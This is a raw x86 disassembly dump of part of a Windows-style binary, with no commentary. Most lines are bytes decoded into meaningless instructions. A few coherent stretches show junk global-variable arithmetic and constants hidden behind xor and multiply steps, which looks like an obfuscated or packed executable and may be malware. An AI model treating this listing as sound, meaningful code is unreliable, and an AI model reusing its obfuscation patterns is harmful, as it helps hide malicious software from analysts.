  4058df:	sbb    eax,0x1f7f54f6
  4058e4:	push   esp
  4058e5:	popf   
  4058e6:	mov    cl,0xa5
  4058e9:	mov    eax,0xa007932e
  4058ee:	ja     0x40595a
  4058f0:	lds    eax,FWORD PTR [ecx-0x8461959]
  4058f6:	and    al,dl
  4058f8:	shl    BYTE PTR [edx],1
  4058fa:	inc    esp
  4058fb:	aaa    
  4058fc:	dec    esi
  4058fd:	ret    0xab71
  405900:	jl     0x405959
  405902:	ja     0x4058e1
  405904:	out    0x2c,al
  405906:	jno    0x4058b9
  405908:	lock pop ds
  40590a:	mov    WORD PTR [eax],gs
  40590c:	push   ecx
  40590d:	xor    DWORD PTR [edi],0x3ab1645a
  405913:	ror    BYTE PTR [ebx+eiz*1+0x6d864c8f],cl
  40591a:	jae    0x405947
  40591c:	out    dx,al
  40591d:	(bad)  
  405920:	(bad)  
  405921:	push   0x5a1edbc9
  405926:	jmp    0xc92c5c66
  40592b:	mov    DWORD PTR [ebx+0x2],edi
  40592e:	fmul   QWORD PTR [edx]
  405930:	das    
  405931:	cmp    ch,0xd
  405934:	loopne 0x4058f2
  405936:	pop    eax
  405937:	out    0x8d,al
  405939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593a:	jnp    0x4059a9
  40593c:	ror    BYTE PTR cs:[ecx-0x10d17742],1
  405943:	mov    dl,0x50
  405945:	add    esp,DWORD PTR [ebx]
  405947:	mov    cl,0x34
  405949:	cmp    eax,0x2caec62a
  40594e:	call   0x1f7a59f3
  405953:	sbb    bl,BYTE PTR [eax+0x45]
  405956:	mov    eax,0xf4dacdc2
  40595b:	(bad)  
  40595c:	adc    cl,bh
  40595e:	sub    eax,0xabfaa37c
  405963:	mov    ch,BYTE PTR [ecx-0x37]
  405966:	aam    0xbb
  405968:	inc    ecx
  405969:	push   esi
  40596a:	push   es
  40596b:	(bad)  
  40596c:	iret   
  40596d:	push   DWORD PTR [esi-0x3c]
  405970:	retf   
  405971:	adc    edi,DWORD PTR [ebp-0x27]
  405974:	mov    ds:0x7af40001,al
  405979:	daa    
  40597a:	fwait
  40597b:	retf   
  40597c:	mov    al,0x2f
  40597e:	adc    cl,dh
  405980:	nop
  405981:	add    al,0xee
  405983:	jmp    0xb457:0x5796d26f
  40598a:	mov    ds,WORD PTR [edi+0x31]
  40598d:	pop    ecx
  40598e:	mov    WORD PTR [ebx+eax*4-0x2e],ds
  405992:	cmp    bl,BYTE PTR [esi+edx*8+0x611f4bf3]
  405999:	lock test DWORD PTR [edi],esp
  40599c:	sbb    edx,DWORD PTR [edi]
  40599e:	cs push ecx
  4059a0:	mov    ss,edi
  4059a2:	rcl    BYTE PTR [edx],1
  4059a4:	rcr    edx,0x8f
  4059a7:	jmp    0xf5d4b90a
  4059ac:	jns    0x405a0f
  4059ae:	or     esi,esp
  4059b0:	sar    DWORD PTR [edx+0x538ab244],cl
  4059b6:	ins    BYTE PTR es:[edi],dx
  4059b7:	mov    ch,0xaf
  4059b9:	dec    edx
  4059ba:	cmp    BYTE PTR [ebp+0x63cf93dc],bh
  4059c0:	imul   eax,ebx,0x6d34a3e3
  4059c6:	shl    DWORD PTR [eax],cl
  4059c8:	sar    BYTE PTR [ebp-0x52],cl
  4059cb:	sbb    eax,0x1eabfb71
  4059d0:	and    eax,DWORD PTR [edi-0x22f7ee82]
  4059d6:	xchg   DWORD PTR [ebx-0x4d5b959c],ebx
  4059dc:	or     esp,DWORD PTR [edx-0x4407b28a]
  4059e2:	dec    esp
  4059e3:	jl     0x4059a7
  4059e5:	rol    DWORD PTR [ebx-0x1dcb945f],cl
  4059eb:	shl    BYTE PTR [esp+eax*4-0x163aaa1d],cl
  4059f2:	xor    BYTE PTR [edi-0x3c],cl
  4059f5:	mov    ds:0xf68949ca,al
  4059fa:	cmp    BYTE PTR [ecx+0x79],0x24
  4059fe:	xchg   BYTE PTR [edi-0x14689bc],bh
  405a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a05:	add    ebx,DWORD PTR [ebx+0x63543f38]
  405a0b:	inc    edx
  405a0c:	jae    0x4059ab
  405a0e:	mov    ch,0x41
  405a10:	cmp    eax,0xde41b6b8
  405a15:	clc    
  405a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a17:	ficom  DWORD PTR [eax+0x42c03e8f]
  405a1d:	pop    eax
  405a1e:	std    
  405a1f:	mov    ebx,ebx
  405a21:	sbb    ch,cl
  405a23:	lock add esp,DWORD PTR ds:0xb34b8777
  405a2a:	mov    ebp,0x9ebf6e7b
  405a2f:	jp     0x4059ea
  405a31:	cmp    eax,0xd8774f27
  405a36:	xchg   BYTE PTR [ebx+0x2b],al
  405a39:	jp     0x405a43
  405a3b:	mov    al,BYTE PTR [edx-0x54]
  405a3e:	adc    esi,eax
  405a40:	jne    0x4059e2
  405a42:	ds add ah,al
  405a45:	xchg   ebp,eax
  405a46:	mov    esi,0xf790119c
  405a4b:	or     BYTE PTR [esi-0x38c10bb2],bh
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x8a32624d
  405b88:	mov    ebp,0x7032843a
  405b8d:	jo     0x405b39
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bd3
  405b93:	xor    DWORD PTR [esi],0xffffffb7
  405b96:	push   0xf43c7b45
  405b9b:	loop   0x405c04
  405b9d:	lods   al,BYTE PTR ds:[esi]
  405b9e:	jmp    FWORD PTR [esi+0x81fc8b0]
  405ba4:	mov    ch,0x5c
  405ba6:	dec    edx
  405ba7:	shl    DWORD PTR [edx-0x1bdfd870],0xe2
  405bae:	ss retf 0x9c41
  405bb2:	jmp    0x7c2a9b46
  405bb7:	or     ah,bl
  405bb9:	in     al,0x59
  405bbb:	std    
  405bbc:	mov    edx,0xb464ebe1
  405bc1:	or     edi,esp
  405bc3:	icebp  
  405bc4:	jmp    0x75da:0x16102ce0
  405bcb:	aaa    
  405bcc:	sub    DWORD PTR [esi+0xa841758],esp
  405bd2:	(bad)  
  405bd3:	pop    ebp
  405bd4:	cmp    cl,BYTE PTR [eax+0x38]
  405bd7:	push   ecx
  405bd8:	sbb    ecx,DWORD PTR [ebx+0x19]
  405bdb:	lods   al,BYTE PTR ds:[esi]
  405bdc:	in     eax,dx
  405bdd:	imul   edi,ecx,0x31
  405be0:	xor    al,0x54
  405be2:	mov    ds,WORD PTR [ebx-0x56ce6586]
  405be8:	imul   edx,edi,0x5f
  405beb:	mov    edi,DWORD PTR [edi]
  405bed:	loopne 0x405bd0
  405bef:	add    al,0x6b
  405bf1:	mov    ah,0x6f
  405bf3:	inc    ecx
  405bf4:	in     eax,dx
  405bf5:	sbb    DWORD PTR [esi],0xf8c67a31
  405bfb:	mov    bl,0x19
  405bfd:	xor    al,0xfb
  405bff:	pop    edx
  405c00:	dec    ebx
  405c01:	jne    0x405c7f
  405c03:	stc    
  405c04:	sti    
  405c05:	xor    edx,DWORD PTR [edi+0xb05b637]
  405c0b:	loop   0x405bf9
  405c0d:	cmc    
  405c0e:	scas   al,BYTE PTR es:[edi]
  405c0f:	pop    esp
  405c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c11:	sub    eax,0x5bb9b441
  405c16:	mov    eax,ds:0x137f5482
  405c1b:	sub    BYTE PTR [ebx+0x54],ch
  405c1e:	and    bl,BYTE PTR [esi-0x5]
  405c21:	test   al,0x86
  405c23:	sar    DWORD PTR [esi+0x3b],1
  405c26:	ss jne 0x405c2c
  405c29:	test   eax,0xb19f0c7e
  405c2e:	adc    eax,0x9fd99631
  405c33:	push   ss
  405c34:	gs out 0xb5,eax
  405c37:	inc    esi
  405c38:	mov    eax,DWORD PTR [edi+0x74]
  405c3b:	jle    0x405c21
  405c3d:	push   ebx
  405c3e:	imul   ebp,DWORD PTR [edx],0x4d5ddcd7
  405c44:	jbe    0x405c09
  405c46:	mov    edx,0x9ee4b1b5
  405c4b:	dec    eax
  405c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c4d:	test   DWORD PTR [ecx+0x11],ecx
  405c50:	stos   BYTE PTR es:[edi],al
  405c51:	sbb    al,0xd9
  405c53:	lods   al,BYTE PTR ds:[esi]
  405c54:	bound  ecx,QWORD PTR ds:0x2392b2d2
  405c5a:	bound  esi,QWORD PTR [ebp-0x80d03a5]
  405c60:	jae    0x405ca4
  405c62:	sub    eax,0x1c7c153e
  405c67:	and    DWORD PTR gs:[ebx],ebx
  405c6a:	mov    WORD PTR [ecx+0x34],fs
  405c6d:	and    eax,0xcfb6ebb7
  405c72:	je     0x405c09
  405c74:	add    DWORD PTR [esi],ebp
  405c76:	mov    esp,0x1de37694
  405c7b:	mov    edi,DWORD PTR [ebx-0x36614c05]
  405c81:	(bad)  
  405c82:	das    
  405c83:	jecxz  0x405c8f
  405c85:	ja     0x405c43
  405c87:	(bad)  
  405c88:	push   esi
  405c89:	jg     0x405c65
  405c8b:	out    dx,eax
  405c8c:	nop
  405c8d:	test   ecx,ebp
  405c8f:	retf   
  405c90:	add    ecx,DWORD PTR [eax+0x14]
  405c93:	cmp    esi,0x41
  405c96:	dec    eax
  405c97:	jae    0x405c86
  405c99:	jg     0x405cf7
  405c9b:	popa   
  405c9c:	mov    al,0x7
  405c9e:	dec    esi
  405c9f:	popf   
  405ca0:	mov    al,ds:0xe6fafd50
  405ca5:	xchg   ebp,eax
  405ca6:	mov    eax,ds:0x1dce36ef
  405cab:	test   eax,0x50d89104
  405cb0:	(bad)
  405cb3:	out    dx,al
  405cb4:	jg     0x405ccb
  405cb6:	fnstcw WORD PTR [edx-0x11d2ecc9]
  405cbc:	pop    edx
  405cbd:	aas    
  405cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbf:	cmp    ecx,eax
  405cc1:	pop    ds
  405cc2:	xor    eax,0xf55fbdfd
  405cc7:	(bad)  [eax-0x21]
  405cca:	lds    esi,FWORD PTR [eax+0x14ae23f6]
  405cd0:	retf   0xeda0
  405cd3:	int    0xd3
  405cd5:	inc    edi
  405cd6:	push   cs
  405cd7:	cli    
  405cd8:	shl    BYTE PTR [ebx+edi*4+0x6c],0xdc
  405cdd:	jb     0x405d2f
  405cdf:	cmp    bl,BYTE PTR [esi+0x3b83cf78]
  405ce5:	pop    es
  405ce6:	xor    eax,0xba51f5c2
  405ceb:	iret   
  405cec:	or     esi,ebx
  405cee:	xor    dl,ch
  405cf0:	mov    dl,0x27
  405cf2:	in     al,0x8f
  405cf4:	out    0x50,al
  405cf6:	cmovnp ebx,DWORD PTR cs:[ebx+0x18c16d02]
  405cfe:	cld    
  405cff:	(bad)  
  405d00:	lods   eax,DWORD PTR ds:[esi]
  405d01:	xchg   ebp,eax
  405d02:	sbb    DWORD PTR [ecx-0x1f437810],edx
  405d08:	sub    al,0x88
  405d0a:	lods   eax,DWORD PTR ds:[si]
  405d0c:	clc    
  405d0d:	and    ch,BYTE PTR [ecx]
  405d0f:	in     eax,dx
  405d10:	jmp    FWORD PTR ds:0xf350a4cd
  405d16:	loope  0x405d4c
  405d18:	popa   
  405d19:	inc    esi
  405d1a:	dec    ebx
  405d1b:	test   BYTE PTR [eax+0xc],ah
  405d1e:	sub    DWORD PTR [eax+edi*1],0x7119c08d
  405d25:	xchg   ebx,eax
  405d26:	outs   dx,BYTE PTR ds:[esi]
  405d27:	fisub  DWORD PTR [eax]
  405d29:	imul   esp,DWORD PTR [edx-0x10],0x10
  405d2d:	mov    ds:0xdd440033,eax
  405d32:	xor    al,BYTE PTR [edx]
  405d34:	xorps  xmm3,xmm1
  405d37:	pop    ebx
  405d38:	adc    BYTE PTR [ecx],dh
  405d3a:	out    dx,eax
  405d3b:	(bad)  
  405d3c:	mov    edi,0xb58e6f69
  405d41:	jbe    0x405d19
  405d43:	mov    DWORD PTR [ebx-0x4179c6b7],eax
  405d49:	jmp    0xcd195c03
  405d4e:	mov    al,ds:0x73a283fa
  405d53:	push   0xffffff95
  405d55:	ret    
  405d56:	rol    DWORD PTR [edi-0x30],1
  405d59:	imul   DWORD PTR [ebp-0xf]
  405d5c:	gs jo  0x405dc6
  405d5f:	fimul  DWORD PTR [ebx+eax*1-0x17]
  405d63:	mov    WORD PTR [esi],?
  405d65:	push   ss
  405d66:	pusha  
  405d67:	inc    esi
  405d68:	jmp    0x405d54
  405d6a:	mov    edi,0x7494fc58
  405d6f:	jp     0x405d54
  405d71:	popa   
  405d72:	nop
  405d73:	repnz push ds
  405d75:	add    esi,DWORD PTR [edx-0x14]
  405d78:	mov    eax,0xa18bebc0
  405d7d:	jnp    0x405d2e
  405d7f:	aam    0x87
  405d81:	sub    edx,ebx
  405d83:	dec    esp
  405d84:	push   cs
  405d85:	ds sub eax,0x3d3f1075
  405d8b:	xor    ebx,DWORD PTR [esi+0x55]
  405d8e:	push   esi
  405d8f:	push   cs
  405d90:	pop    ds
  405d91:	div    BYTE PTR [edi-0x42f20098]
  405d97:	rcr    BYTE PTR [ebp-0x4ad52c53],0x45
  405d9e:	inc    edx
  405d9f:	ret    0xe98
  405da2:	mov    ch,0xeb
  405da4:	or     DWORD PTR [edi],esi
  405da6:	cmp    al,0x27
  405da8:	sti    
  405da9:	pop    ebx
  405daa:	inc    ebx
  405dab:	mov    dh,cl
  405dad:	das    
  405dae:	cdq    
  405daf:	(bad)  
  405db0:	fisttp QWORD PTR ds:0x28fc8869
  405db6:	cs rcl eax,1
  405db9:	outs   dx,BYTE PTR ds:[esi]
  405dba:	or     ecx,DWORD PTR ds:0xb7e392a9
  405dc0:	inc    BYTE PTR ds:0xe2c6
  405dc5:	std    
  405dc6:	cmp    BYTE PTR [edx+0x3],dl
  405dc9:	xor    dh,BYTE PTR [eax-0x27]
  405dcc:	xor    DWORD PTR [esp+esi*2-0x51],0x3b
  405dd1:	out    dx,al
  405dd2:	(bad)  
  405dd3:	fsub   st,st(7)
  405dd5:	popa   
  405dd6:	mov    DWORD PTR [eax+0xb375b2],ecx
  405ddc:	out    0x25,al
  405dde:	push   esi
  405ddf:	xchg   ebp,eax
  405de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405de1:	dec    esi
  405de2:	inc    ebx
  405de3:	sar    BYTE PTR [ebp-0x1e],1
  405de6:	lea    ebx,[ebp-0x46]
  405de9:	jb     0x405d95
  405deb:	pop    ss
  405dec:	repz dec esp
  405dee:	mov    edx,0x73d9bcc6
  405df3:	adc    bh,BYTE PTR [ebx]
  405df5:	mov    dh,0xdf
  405df7:	lods   al,BYTE PTR ds:[esi]
  405df8:	stos   BYTE PTR es:[edi],al
  405df9:	mov    dl,0x35
  405dfb:	inc    ecx
  405dfc:	shr    ebp,1
  405dfe:	outs   dx,DWORD PTR ds:[esi]
  405dff:	jp     0x405dba
  405e01:	jns    0x405e23
  405e03:	cwde   
  405e04:	dec    ebx
  405e05:	add    BYTE PTR [edx+0x64],0xbf
  405e09:	pop    edx
  405e0a:	mov    esp,0xacf01bea
  405e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e10:	push   ebx
  405e11:	sub    al,0x66
  405e13:	popa   
  405e14:	inc    eax
  405e15:	retf   0xbee8
  405e18:	cmp    cl,BYTE PTR [ebp-0x27]
  405e1b:	cld    
  405e1c:	ja     0x405da0
  405e1e:	jno    0x405e9b
  405e20:	lods   eax,DWORD PTR ds:[esi]
  405e21:	fadd   QWORD PTR [ebx-0x70d6efcd]
  405e27:	or     esp,DWORD PTR [eax+ebx*8]
  405e2a:	pushf  
  405e2b:	adc    BYTE PTR [edi-0x28],ah
  405e2e:	bound  eax,QWORD PTR [ebp+0x7c]
  405e31:	pop    ebx
  405e32:	mov    edx,0xef20cbe8
  405e37:	cwde   
  405e38:	aas    
  405e39:	test   eax,ebp
  405e3b:	mov    WORD PTR ss:[ebx-0xda12e3c],?
  405e42:	cli    
  405e43:	xor    ebx,DWORD PTR [ecx+0x20]
  405e46:	call   0x8bc1:0x3c23336
  405e4d:	dec    ebp
  405e4e:	or     al,0xf
  405e50:	scas   eax,DWORD PTR es:[edi]
  405e51:	rol    DWORD PTR [ebx],0x45
  405e54:	or     BYTE PTR [ecx+0x458b0c45],cl
  405e5a:	or     al,0x5e
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x8f
  405ea8:	retf   
  405ea9:	dec    ecx
  405eaa:	mov    ch,0x3e
  405eac:	aas    
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eca
  405eb4:	ret    
  405eb5:	pop    ss
  405eb6:	and    ebx,0x6ce85a33
  405ebc:	sub    ebx,DWORD PTR [esi-0x414c92af]
  405ec2:	xchg   edi,eax
  405ec3:	mov    DWORD PTR [esp+eax*2+0x67],ebp
  405ec7:	test   al,0xac
  405ec9:	fst    QWORD PTR [edx+ebp*1-0x3dbe34b9]
  405ed0:	and    ebp,DWORD PTR [eax+0x640511f3]
  405ed6:	dec    edi
  405ed7:	jg     0x405efa
  405ed9:	xchg   ecx,eax
  405eda:	jnp    0x405f49
  405edc:	test   al,0xf9
  405ede:	jecxz  0x405efd
  405ee0:	xchg   DWORD PTR ds:0xa1bc5b70,edi
  405ee6:	and    al,0x50
  405ee8:	jle    0x405ee0
  405eea:	mov    bl,bl
  405eec:	pop    ebp
  405eed:	pop    esp
  405eee:	out    dx,al
  405eef:	and    al,0x32
  405ef1:	scas   al,BYTE PTR es:[edi]
  405ef2:	and    bh,BYTE PTR [eax+0x44]
  405ef5:	das    
  405ef6:	imul   edx,DWORD PTR [edi-0x64],0x1f
  405efa:	pop    eax
  405efb:	imul   ebx,DWORD PTR [edi-0x4a],0xca99c604
  405f02:	xchg   DWORD PTR [esp+ebp*4],ebp
  405f05:	mov    ch,0xe
  405f07:	ret    
  405f08:	(bad)  
  405f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f0b:	imul   ebp,DWORD PTR [eax+ebp*8+0x3a],0x3e
  405f10:	shl    dh,0xae
  405f13:	gs stc 
  405f15:	and    BYTE PTR [ebp+0x1c],0xbf
  405f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f1a:	inc    ecx
  405f1b:	inc    ch
  405f1d:	pop    edi
  405f1e:	fcmovne st,st(4)
  405f20:	jle    0x405ee6
  405f22:	push   eax
  405f23:	aas    
  405f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f25:	test   eax,0x53f848f6
  405f2a:	fadd   DWORD PTR [esi+0x29]
  405f2d:	jmp    0xc0ca:0x68036511
  405f34:	sbb    ah,bl
  405f36:	fmul   st(7),st
  405f38:	pop    es
  405f39:	pop    ebx
  405f3a:	dec    edx
  405f3b:	dec    esi
  405f3c:	or     eax,0xdfdb2a4c
  405f41:	jle    0x405f16
  405f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f44:	mov    BYTE PTR [edi-0x5718cf9e],dl
  405f4a:	add    ecx,0xffffffd1
  405f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f4e:	and    al,0x22
  405f50:	out    0x2b,eax
  405f52:	push   edi
  405f53:	and    BYTE PTR [esi],bh
  405f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f56:	add    al,0x38
  405f58:	xchg   BYTE PTR [ebp+0xfdd2391],al
  405f5e:	cmc    
  405f5f:	aam    0xc9
  405f61:	mov    BYTE PTR [edx+ebx*8],dl
  405f64:	(bad)  
  405f65:	or     DWORD PTR [esi+eax*4-0x7e],ebp
  405f69:	(bad)  
  405f6a:	mov    edx,0x5ca58296
  405f6f:	or     BYTE PTR [ebp+0xf],0xd3
  405f73:	jl     0x405f1d
  405f75:	pop    esp
  405f76:	adc    al,0x1d
  405f78:	(bad)  
  405f7a:	dec    ecx
  405f7b:	dec    ebx
  405f7c:	push   esp
  405f7d:	fs nop
  405f7f:	push   0xfffffff2
  405f81:	adc    bl,cl
  405f83:	stos   DWORD PTR es:[edi],eax
  405f84:	xchg   esi,eax
  405f85:	pushf  
  405f86:	sahf   
  405f87:	(bad)  
  405f88:	outs   dx,BYTE PTR ds:[esi]
  405f89:	dec    edx
  405f8a:	and    bl,BYTE PTR [ebp+0x3343ce5d]
  405f90:	and    al,0x54
  405f92:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  405f94:	sar    eax,0xd9
  405f97:	mov    eax,eax
  405f99:	mov    DWORD PTR [ebx+0x5e],ebp
  405f9c:	imul   ecx,DWORD PTR ds:0x7fcfc58,0x71
  405fa3:	dec    edi
  405fa4:	jb     0x405ff6
  405fa6:	in     al,dx
  405fa7:	adc    bh,0x42
  405faa:	push   edi
  405fab:	push   esp
  405fac:	mov    ds:0xebbcd09f,eax
  405fb1:	icebp  
  405fb2:	adc    eax,0x840eab74
  405fb7:	add    esi,DWORD PTR [ebx]
  405fb9:	stos   DWORD PTR es:[edi],eax
  405fba:	mov    bh,BYTE PTR [edi-0x1a]
  405fbd:	push   ebp
  405fbe:	leave  
  405fbf:	and    eax,0x9dc4413f
  405fc4:	mov    ebp,0x39f526c3
  405fc9:	hlt    
  405fca:	sbb    al,0x10
  405fcc:	mov    edx,0xf23ea653
  405fd1:	xchg   edx,eax
  405fd2:	add    al,0xb8
  405fd4:	mov    eax,ds:0x95ffffe9
  405fd9:	mov    bh,0x52
  405fdb:	xchg   edi,eax
  405fdc:	test   al,0xe6
  405fde:	repnz adc esi,edi
  405fe1:	jl     0x405fc5
  405fe3:	or     BYTE PTR [eax+0x11],bh
  405fe6:	daa    
  405fe7:	(bad)  
  405fe8:	jb     0x405fa7
  405fea:	mov    ebx,0xe174e812
  405fef:	adc    BYTE PTR [ebp+0x6f585867],bl
  405ff5:	cmc    
  405ff6:	inc    eax
  405ff7:	jg     0x406065
  405ff9:	test   al,0x44
  405ffb:	test   al,0x2c
  405ffd:	cmp    DWORD PTR [edx-0x40],esp
  406000:	daa    
  406001:	sahf   
  406002:	jne    0x405ff3
  406004:	or     dl,BYTE PTR [ebp+0x49]
  406007:	and    BYTE PTR [esi],dl
  406009:	inc    esi
  40600a:	jns    0x405fdd
  40600c:	stc    
  40600d:	out    0x4e,al
  40600f:	sbb    DWORD PTR [edi+0x3bd79711],edx
  406015:	jp     0x406096
  406017:	jg     0x40601d
  406019:	je     0x406094
  40601b:	lahf   
  40601c:	fistp  DWORD PTR [edi]
  40601e:	(bad)  
  40601f:	stc    
  406020:	dec    esi
  406021:	xor    al,0xe2
  406023:	sbb    DWORD PTR [ecx+0x77],eax
  406026:	repz out 0x2c,al
  406029:	xchg   edi,eax
  40602a:	shr    ebp,1
  40602c:	xchg   edi,eax
  40602d:	adc    DWORD PTR [ebx+0x17f0b14d],0x3c
  406034:	jb     0x406092
  406036:	mov    bh,0x44
  406038:	shl    ebp,0x1b
  40603b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40603c:	jno    0x406009
  40603e:	inc    edx
  40603f:	jmp    0x40601a
  406041:	pop    ds
  406042:	shr    BYTE PTR [ebx-0x78438c76],1
  406048:	call   FWORD PTR gs:[edi]
  40604b:	jmp    0x40604d
  40604d:	push   ss
  40604e:	lods   eax,DWORD PTR ds:[esi]
  40604f:	pop    edx
  406050:	shl    BYTE PTR [ebp+0x50],1
  406053:	or     ecx,edi
  406055:	fbld   TBYTE PTR [ebx]
  406057:	not    DWORD PTR [edx+0x59b6bc3]
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fd860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x7975d896
  4060dc:	pop    ss
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406119
  4060e6:	cs xor eax,0x5730de89
  4060ec:	mov    bl,0x83
  4060ee:	dec    eax
  4060ef:	sub    dh,BYTE PTR [ebp-0x10]
  4060f2:	push   ss
  4060f3:	push   esp
  4060f4:	mov    al,0x7b
  4060f6:	push   0x2088a02e
  4060fb:	push   eax
  4060fc:	dec    edi
  4060fd:	aaa    
  4060fe:	popa   
  4060ff:	push   edx
  406100:	pop    esi
  406101:	push   edx
  406102:	sar    DWORD PTR [ebx-0x52af8bdd],cl
  406108:	mov    bl,0xf6
